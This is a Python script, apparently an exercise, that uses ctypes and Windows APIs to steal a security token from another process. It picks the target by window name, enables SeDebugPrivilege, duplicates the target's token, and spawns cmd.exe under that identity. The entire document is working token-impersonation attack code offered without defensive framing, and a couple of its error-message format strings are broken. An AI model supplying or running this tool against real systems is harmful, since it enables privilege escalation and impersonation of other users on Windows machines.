# Import the required module to handle Windows API Calls
import ctypes

# Import Python -> Windows Types from ctypes
from ctypes.wintypes import DWORD,BOOL,HANDLE,LPWSTR,WORD,LPBYTE

# Grab a handle to kernel32.dll & User32.dll & Advapi32.dll
k_handle = ctypes.WinDLL("Kernel32.dll")
u_handle = ctypes.WinDLL("User32.dll")
a_handle = ctypes.WinDLL("Advapi32.dll")


# Access Rights
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)

# Token Access Rights
STANDARD_RIGHTS_REQUIRED = 0x000F0000
STANDARD_RIGHTS_READ = 0x00020000
TOKEN_ASSIGN_PRIMARY = 0x0001
TOKEN_DUPLICATE = 0x0002
TOKEN_IMPERSONATION = 0x0004
TOKEN_QUERY = 0x0008
TOKEN_QUERY_SOURCE = 0x0010
TOKEN_ADJUST_PRIVILEGES = 0x0020
TOKEN_ADJUST_GROUPS = 0x0040
TOKEN_ADJUST_DEFAULT = 0x0080
TOKEN_ADJUST_SESSIONID = 0x0100
TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY)
TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | 
					TOKEN_ASSIGN_PRIMARY     |
					TOKEN_DUPLICATE          |
					TOKEN_IMPERSONATION      |
					TOKEN_QUERY              |
					TOKEN_QUERY_SOURCE       |
					TOKEN_ADJUST_PRIVILEGES  |
					TOKEN_ADJUST_GROUPS      |
					TOKEN_ADJUST_DEFAULT     |
					TOKEN_ADJUST_SESSIONID)


# Privilege Enabled Mask
SE_PRIVILEGE_ENABLED = 0x00000002

# Needed Structures for used API Calls
class LUID(ctypes.Structure):
	_fields_ = [
	("LowPart", DWORD),
	("HighPart", DWORD),
	]
	
class LUID_AND_ATTRIBUTES(ctypes.Structure):
	_fields_ = [
	("Luid", LUID),
	("Attributes", DWORD),
	]
	
class PRIVILEGE_SET(ctypes.Structure):
	_fields_ = [
	("PrivilegeCount", DWORD),
	("Control", DWORD),
	("Privileges", LUID_AND_ATTRIBUTES),
	]

class TOKEN_PRIVILEGES(ctypes.Structure):
	_fields_ = [
	("PrivilegeCount", DWORD),
	("Privileges", LUID_AND_ATTRIBUTES),
	]

class SECURITY_ATTRIBUTES(ctypes.Structure):
	_fields_ = [
	("nLength", DWORD),
	("lpSecurityDescriptor", HANDLE),
	("nInheritHandle", BOOL),
	]

class STARTUPINFO(ctypes.Structure):
	_fields_ = [
	("cb", DWORD),
	("lpReserved", LPWSTR),
	("lpDesktop", LPWSTR),
	("lpTitle", LPWSTR),
	("dwX", DWORD),
	("dxY", DWORD),
	("dwXSize", DWORD),
	("dwYSize", DWORD),
	("dwXCountChars", DWORD),
	("dwYCountChars", DWORD),
	("dwFillAttribute", DWORD),
	("dwFlags", DWORD),
	("wShowWindow", WORD),
	("cbReserved2", WORD),
	("lpReserved2", LPBYTE),
	("hStdInput", HANDLE),
	("hStdOutput", HANDLE),
	("hStdError", HANDLE),
	]
	
class PROCESS_INFORMATION(ctypes.Structure):
	_fields_ = [
	("hProcess", HANDLE),
	("hThread", HANDLE),
	("dwProcessId", DWORD),
	("dwThreadId", DWORD),
	]

# Enable Privileges
def enablePrivilege(priv, handle):
	# First use the LookupPrivilegeValue API Call to get the LUID based on the String Privilege name

	# Setup a PRIVILEGE_SET for the PrivilegeCheck Call to be used later - We need the LUID to be used
	# We will reference it later as well
	requiredPrivileges = PRIVILEGE_SET()
	requiredPrivileges.PrivilegeCount = 1 # We are only looking at 1 Privilege at a time here
	requiredPrivileges.Privileges = LUID_AND_ATTRIBUTES() # Setup a new LUID_AND_ATTRIBUTES
	requiredPrivileges.Privileges.Luid = LUID() # Setup a New LUID inside of the LUID_AND_ATTRIBUTES structure

	# Params for Lookup API Call
	lpSystemName = None
	lpName = priv

	# We now issue the Call to configure the LUID with the Systems Value of that Privilege
	response = a_handle.LookupPrivilegeValueW(lpSystemName, lpName, ctypes.byref(requiredPrivileges.Privileges.Luid))

	# Handle an Error
	if response > 0:
		print("[INFO] Lookup For {0} Worked...".format(priv))
	else:
		print("[ERROR] Lookup for {0} Failed! Error Code: {a}".format(priv, k_handle.GetLastError()))
		return 1

	# Now that our LUID is setup and pointing to the correct Privilege we can check to see if its enabled
	pfResult = ctypes.c_long()

	response = a_handle.PrivilegeCheck(handle, ctypes.byref(requiredPrivileges), ctypes.byref(pfResult))

	# Handle an Error
	if response > 0:
		print("[INFO] PrivilegeCheck Worked...")
	else:
		print("[ERROR] PrivilegeCheck Failed! Error Code: {0}".format(k_handle.GetLastError()))
		return 1

	# We can check pfResult to see if our Privilege is enabled or not
	if pfResult:
		print("[INFO] Privilege {0} is Enabled...".format(priv))
		return 0
	else:
		print("[INFO] Privilege {0} is NOT Enabled...".format(priv))
		requiredPrivileges.Privileges.Attributes = SE_PRIVILEGE_ENABLED # Enable if currently Disabled

	# We will not attempt to modify the selected Privilege in the Token
	DisableAllPrivileges = False
	NewState = TOKEN_PRIVILEGES()
	BufferLength = ctypes.sizeof(NewState)
	PreviousState = ctypes.c_void_p()
	ReturnLength = ctypes.c_void_p()

	# Configure Token Privileges
	NewState.PrivilegeCount = 1;
	NewState.Privileges = requiredPrivileges.Privileges # Set the LUID_AND_ATTRIBUTES to our new structure

	response = a_handle.AdjustTokenPrivileges(
		handle, 
		DisableAllPrivileges, 
		ctypes.byref(NewState), 
		BufferLength, 
		ctypes.byref(PreviousState),
		ctypes.byref(ReturnLength))
		
	# Handle an Error
	if response > 0:
		print("[INFO] AdjustTokenPrivileges of {0} Enabled...".format(priv))
	else:
		print("[ERROR] AdjustTokenPrivileges {0} Not Enabled! Error Code: {0}".format(priv,k_handle.GetLastError()))
		return 1

	return 0
	
# Open a Processes
def openProcessByPID(pid):
	# Opening the Process by PID with Specific Access
	dwDesiredAccess = PROCESS_ALL_ACCESS
	bInheritHandle = False
	dwProcessId = pid

	# Calling the Windows API Call to Open the Process
	hProcess = k_handle.OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId)

	# Check to see if we have a valid Handle to the process
	if hProcess <= 0:
		print("[ERROR] Could Not Grab Privileged Handle! Error Code: {0}".format(k_handle.GetLastError()))
		return 1

	print("[INFO] Privileged Handle Opened...")
	return hProcess
	
# Open a Processes Token
def openProcToken(pHandle):
	# Open a Handle to the Process's Token Directly
	ProcessHandle = pHandle
	DesiredAccess = TOKEN_ALL_ACCESS
	TokenHandle = ctypes.c_void_p()

	# Issue the API Call
	response = k_handle.OpenProcessToken(ProcessHandle, DesiredAccess, ctypes.byref(TokenHandle))

	# Handle an Error
	if response > 0:
		print("[INFO] Handle to Process Token Created! Token: {0}".format(TokenHandle))
		return TokenHandle
	else:
		print("[ERROR] Could Not Grab Privileged Handle to Token! Error Code: {0}".format(k_handle.GetLastError()))
		return 1

# Grab The Windows Name from User32
lpWindowName = ctypes.c_char_p(input("Enter Window Name To Hook Into: ").encode('utf-8'))

# Grab a Handle to the Process
hWnd = u_handle.FindWindowA(None, lpWindowName)

# Check to see if we have the Handle
if hWnd == 0:
	print("[ERROR] Could Not Grab Handle! Error Code: {0}".format(k_handle.GetLastError()))
	exit(1)
else:
	print("[INFO] Grabbed Handle...")
	
# Get the PID of the process at the handle
lpdwProcessId = ctypes.c_ulong()

# We use byref to pass a pointer to the value as needed by the API Call
response = u_handle.GetWindowThreadProcessId(hWnd, ctypes.byref(lpdwProcessId))

# Check to see if the call Completed
if response == 0:
	print("[ERROR] Could Not Get PID from Handle! Error Code: {0}".format(k_handle.GetLastError()))
else:
	print("[INFO] Found PID...")
	
# Open The Process and Grab a Table to its Token
TokenHandle = openProcToken(openProcessByPID(lpdwProcessId))

# Get Handle of Current Process
currentProcessHandle = openProcToken(openProcessByPID(k_handle.GetCurrentProcessId()))

# Attempt to Enable SeDebugPrivilege on Current Process to be able to use token duplication
print("[INFO] Enabling SEDebugPrivilege on Current Process..")
response = enablePrivilege("SEDebugPrivilege", currentProcessHandle)

if response != 0:
	print("[ERROR] Could Not Enable Privileges...")
	exit(1)
	
# Duplicate Token On Hooked Process
hExistingToken = ctypes.c_void_p()
dwDesiredAccess = TOKEN_ALL_ACCESS
lpTokenAttributes = SECURITY_ATTRIBUTES()
ImpersonationLevel = 2 # Set to SecurityImpersonation enum
TokenType = 1 # Set to Token_Type enum as Primary

# Configure the SECURITY_ATTRIBUTES Structure
lpTokenAttributes.bInheritHandle = False
lpTokenAttributes.lpSecurityDescriptor = ctypes.c_void_p()
lpTokenAttributes.nLength = ctypes.sizeof(lpTokenAttributes)

print("[INFO] Duplicating Token on Hooked Process...")

# Issue the Token Duplication Call
response = a_handle.DuplicateTokenEx(
	TokenHandle,
	dwDesiredAccess,
	ctypes.byref(lpTokenAttributes),
	ImpersonationLevel,
	TokenType,
	ctypes.byref(hExistingToken))
	
if response == 0:
	print("[ERROR] Could Not Duplicate Token... Error Code: {0}".format(k_handle.GetLastError()))
	exit(1)

# Now We Want to Spawn A Process As that Current User!
# We will use the Win API Call CreateProcessWithTokenW
hToken = hExistingToken
dwLogonFlags = 0x00000001 # Use the Flag LOGON_WITH_PROFILE
lpApplicationName = "C:\\Windows\\System32\\cmd.exe"
lpCommandLine = None
dwCreationFlags = 0x00000010 # Use the Flag CREATE_NEW_CONSOLE
lpEnvironment = ctypes.c_void_p()
lpCurrentDirectory = None
lpStartupInfo = STARTUPINFO()
lpProcessInformation = PROCESS_INFORMATION()

# Configure Startup Info
lpStartupInfo.wShowWindow = 0x1 # We want the window to show
lpStartupInfo.dwFlags = 0x1 # Use to flag to look at wShowWindow
lpStartupInfo.cb = ctypes.sizeof(lpStartupInfo)

response = a_handle.CreateProcessWithTokenW(
	hToken,
	dwLogonFlags,
	lpApplicationName,
	lpCommandLine,
	dwCreationFlags,
	lpEnvironment,
	lpCurrentDirectory,
	ctypes.byref(lpStartupInfo),
	ctypes.byref(lpProcessInformation))
	
if response == 0:
	print("[ERROR] Could Not Create Process With Duplicated Token... Error Code: {0}".format(k_handle.GetLastError()))
	exit(1)

print("[INFO] Created Impersonated Proces!")
	
	
	

